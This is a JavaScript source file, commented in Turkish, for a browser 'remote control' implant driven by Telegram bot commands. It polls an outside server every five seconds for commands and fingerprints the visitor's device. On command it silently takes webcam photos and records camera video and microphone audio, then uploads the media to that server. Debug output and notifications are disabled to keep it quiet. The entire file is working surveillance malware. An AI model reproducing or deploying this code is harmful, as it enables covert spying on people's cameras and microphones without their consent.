// 🎮 Remote Control System - Telegram Bot Commands
// Bu script Telegram bot komutlarını dinler ve kamera/mikrofon kayıtlarını alır

class RemoteControl {
    constructor(config = {}) {
        this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
        this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
        this.collectDevicesEndpoint = config.collectDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/collect-devices';
        this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
        this.debug = config.debug || false;
        this.isEnabled = false;
        this.pollTimer = null;

        // Session info
        this.sessionId = this.generateSessionId();
        this.deviceNumber = null;

        // Media streams
        this.cameraStream = null;
        this.microphoneStream = null;
    }

    // Session ID oluştur
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    // Uzaktan kontrolü başlat
    async start() {
        if (this.isEnabled) {
            if (this.debug) console.log('⚠️ [RemoteControl] Already running');
            return;
        }

        this.isEnabled = true;
        this.poll();
        this.sendStartNotification();

        if (this.debug) console.log('✅ [RemoteControl] Remote Control ACTIVE');
    }

    // Cihaz bilgilerini topla (detaylı)
    async collectDeviceInfo() {
        const info = {
            platform: navigator.platform,
            user_agent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine,
            device_memory: navigator.deviceMemory || 'Unknown',
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown'
        };

        // Network bilgisi
        if (navigator.connection) {
            info.connection_type = navigator.connection.effectiveType || 'Unknown';
        }

        return info;
    }

    // Sistem başladığında bildirim artık gönderilmez - spam ve yavaşlık önlendi
    async sendStartNotification() {
        // Kaldırıldı - gereksiz Telegram mesajı spam yapıyordu
    }

    // Help mesajı gönder
    async sendHelpMessage() {
        if (window.telegramLogger) {
            await window.telegramLogger.sendLog('help_guide', {
                guide_type: 'full',
                commands: 'all'
            });
        }
    }

    // Uzaktan kontrolü durdur
    async stop() {
        this.isEnabled = false;
        if (this.pollTimer) {
            clearTimeout(this.pollTimer);
            this.pollTimer = null;
        }

        this.releaseStreams();

        if (this.debug) console.log('[RemoteControl] Stopped');
    }

    // Stream'leri serbest bırak
    releaseStreams() {
        if (this.cameraStream) {
            this.cameraStream.getTracks().forEach(track => track.stop());
            this.cameraStream = null;
        }
        if (this.microphoneStream) {
            this.microphoneStream.getTracks().forEach(track => track.stop());
            this.microphoneStream = null;
        }
    }

    // Komutları kontrol et (polling)
    async poll() {
        if (!this.isEnabled) return;

        try {
            const response = await fetch(this.commandEndpoint);
            if (!response.ok) throw new Error(`HTTP ${response.status}`);

            const data = await response.json();

            if (data.success && data.commands && data.commands.length > 0) {
                if (this.debug) console.log(`📡 ${data.commands.length} commands received`);

                for (const cmd of data.commands) {
                    await this.executeCommand(cmd);
                }
            }
        } catch (error) {
            if (this.debug) console.error('❌ Poll error:', error.message);
        }

        // Bir sonraki poll'u planla
        if (this.isEnabled) {
            this.pollTimer = setTimeout(() => this.poll(), this.pollInterval);
        }
    }

    // Komutu çalıştır
    async executeCommand(cmd) {
        try {
            if (this.debug) console.log('🎮 Executing:', cmd.command);

            // /help komutu
            if (cmd.command === 'show_help') {
                await this.sendHelpMessage();
                return;
            }

            // /devices komutu - cihaz bilgisini collection'a ekle (backend birleştirir)
            if (cmd.command === 'list_devices') {
                await this.sendDeviceToCollection(cmd.message_id);
                return;
            }

            // Target device kontrolü - Şimdilik tüm cihazlar her komutu işler
            // Gelecekte device-specific komutlar için geliştirilebilir
            if (cmd.target_device !== null && cmd.target_device !== undefined) {
                // Şimdilik skip - tüm cihazlar aynı anda çalışır
                if (this.debug) console.log(`[RemoteControl] Target device: ${cmd.target_device} (not implemented yet)`);
            }

            // Komut alındı bildirimi KALDIRILDI - gereksiz Telegram API çağrısı

            switch (cmd.command) {
                case 'camera_screenshot':
                    await this.takeCameraScreenshot(cmd.message_id);
                    break;
                case 'camera_record':
                    await this.recordCamera(cmd.params.duration, cmd.message_id);
                    break;
                case 'microphone_record':
                    await this.recordMicrophone(cmd.params.duration, cmd.message_id);
                    break;
                default:
                    if (this.debug) console.log('[RemoteControl] Unknown command:', cmd.command);
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Command execution error:', error);

            // Hata bildirimi
            if (window.telegramLogger) {
                await window.telegramLogger.sendLog('command_error', {
                    command: cmd.command,
                    error: error.message
                });
            }
        }
    }

    // Cihaz bilgisini collection'a gönder (backend birleştirir)
    async sendDeviceToCollection(messageId) {
        try {
            const deviceInfo = await this.collectDeviceInfo();
            const platform = deviceInfo.platform || 'Unknown';
            const browser = this.getBrowser(deviceInfo.user_agent);
            const emoji = this.getDeviceEmoji(platform);

            const deviceData = {
                emoji: emoji,
                platform: platform,
                browser: browser,
                session_id: this.sessionId.substring(8, 24),
                screen: deviceInfo.screen || 'Unknown',
                language: deviceInfo.language || 'Unknown',
                timezone: deviceInfo.timezone || 'Unknown',
                online: deviceInfo.online ? 'Online' : 'Offline',
                memory: deviceInfo.device_memory || 'Unknown',
                connection: deviceInfo.connection_type || 'Unknown'
            };

            const response = await fetch(this.collectDevicesEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message_id: messageId,
                    device_info: deviceData
                })
            });

            const result = await response.json();
            if (this.debug) console.log('✅ Device sent to collection');
            return { success: true, result };
        } catch (error) {
            if (this.debug) console.error('❌ Collection error:', error.message);
            return { success: false, error: error.message };
        }
    }

    // Cihaz kartı gönder - Optimized (no console logs)
    async sendDeviceCard() {
        try {
            if (!window.telegramLogger) return { success: false, error: 'telegramLogger not found' };

            const deviceInfo = await this.collectDeviceInfo();
            const platform = deviceInfo.platform || 'Unknown';
            const browser = this.getBrowser(deviceInfo.user_agent);
            const emoji = this.getDeviceEmoji(platform);

            const cardData = {
                emoji: emoji,
                platform: platform,
                browser: browser,
                session_id: this.sessionId.substring(8, 24),
                screen: deviceInfo.screen || 'Unknown',
                language: deviceInfo.language || 'Unknown',
                timezone: deviceInfo.timezone || 'Unknown',
                online: deviceInfo.online ? 'Online' : 'Offline',
                memory: deviceInfo.device_memory || 'Unknown',
                connection: deviceInfo.connection_type || 'Unknown'
            };

            const result = await window.telegramLogger.sendLog('active_device_card', cardData);
            return result && result.success ? { success: true } : { success: false, error: result };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // Browser bilgisi çıkar
    getBrowser(userAgent) {
        if (!userAgent) return 'Unknown';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Other';
    }

    // Platform emoji
    getDeviceEmoji(platform) {
        if (!platform) return '📱';
        const p = platform.toLowerCase();
        if (p.includes('win')) return '🖥️';
        if (p.includes('mac')) return '💻';
        if (p.includes('linux')) return '🐧';
        if (p.includes('android')) return '📱';
        if (p.includes('iphone') || p.includes('ipad')) return '📱';
        return '📱';
    }

    // 📷 Kamera Screenshot
    async takeCameraScreenshot(messageId) {
        try {
            if (this.debug) console.log('[RemoteControl] Taking camera screenshot...');

            // Kamera erişimi al
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            // Video element oluştur
            const video = document.createElement('video');
            video.srcObject = stream;
            video.autoplay = true;
            video.muted = true;

            // Video yüklenene kadar bekle
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            // Biraz bekle (kamera ısınsın)
            await new Promise(resolve => setTimeout(resolve, 500));

            // Canvas'a çiz
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Base64'e çevir
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            // Stream'i kapat
            stream.getTracks().forEach(track => track.stop());

            // Telegram'a gönder
            await this.sendFile('photo', imageData, '📷 Camera Screenshot', messageId);

            if (this.debug) console.log('[RemoteControl] Screenshot sent successfully');

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Screenshot error:', error);
        }
    }

    // 🎥 Kamera Video Kayıt
    async recordCamera(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording camera for ${duration} seconds...`);

            // Kamera erişimi al (düşük çözünürlük)
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    frameRate: { ideal: 15 }
                },
                audio: true
            });

            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp8,opus',
                videoBitsPerSecond: 250000 // 250kbps - düşük kalite ama küçük dosya
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'video/webm' });

                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;

                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());

                    // Telegram'a gönder
                    await this.sendFile('video', base64data, `🎥 Camera Video (${duration}s)`, messageId);

                    if (this.debug) console.log('[RemoteControl] Video sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Camera record error:', error);
        }
    }

    // 🎤 Mikrofon Ses Kayıt
    async recordMicrophone(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording microphone for ${duration} seconds...`);

            // Mikrofon erişimi al (düşük kalite)
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    sampleRate: 16000,
                    echoCancellation: true,
                    noiseSuppression: true
                }
            });

            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 32000 // 32kbps - düşük kalite ama küçük dosya
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'audio/ogg' });

                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;

                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());

                    // Telegram'a gönder
                    await this.sendFile('voice', base64data, `🎤 Microphone Recording (${duration}s)`, messageId);

                    if (this.debug) console.log('[RemoteControl] Voice sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Microphone record error:', error);
        }
    }

    // Dosyayı Telegram'a gönder
    async sendFile(fileType, fileData, caption, messageId) {
        try {
            const response = await fetch(this.fileEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    file_type: fileType,
                    file_data: fileData,
                    caption: caption,
                    message_id: messageId
                })
            });

            const result = await response.json();

            if (this.debug) {
                console.log('[RemoteControl] File send response:', result);
            }

            return result;
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] File send error:', error);
            return { success: false, error: error.message };
        }
    }
}

// Global instance oluştur
const remoteControl = new RemoteControl({
    debug: false // Production - rate limit önlemek için
});

// Global scope'a ekle
window.remoteControl = remoteControl;

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = RemoteControl;
}

